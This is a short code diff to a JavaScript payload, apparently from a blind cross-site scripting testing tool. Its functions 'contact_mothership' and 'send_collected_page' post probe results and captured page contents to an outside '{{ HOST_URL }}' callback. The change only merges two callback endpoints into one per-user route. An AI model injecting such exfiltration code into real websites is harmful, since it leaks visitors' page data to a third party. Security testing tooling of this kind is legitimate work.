@@ -122,7 +122,7 @@ function contact_mothership(probe_return_data) {
 	});
 
     var http = new XMLHttpRequest();
-    var url = "{{ HOST_URL }}/js_callback";
+    var url = "{{ HOST_URL }}/callback/{{ USERNAME }}";
     http.open("POST", url, true);
     http.onreadystatechange = function() {
         if(http.readyState == 4 && http.status == 200) {
@@ -140,7 +140,7 @@ function send_collected_page( page_data ) {
 	});
 
     var http = new XMLHttpRequest();
-    var url = "{{ HOST_URL }}/page_callback";
+    var url = "{{ HOST_URL }}/callback/{{ USERNAME }}";
     http.open("POST", url, true);
     http.onreadystatechange = function() {
         if(http.readyState == 4 && http.status == 200) {
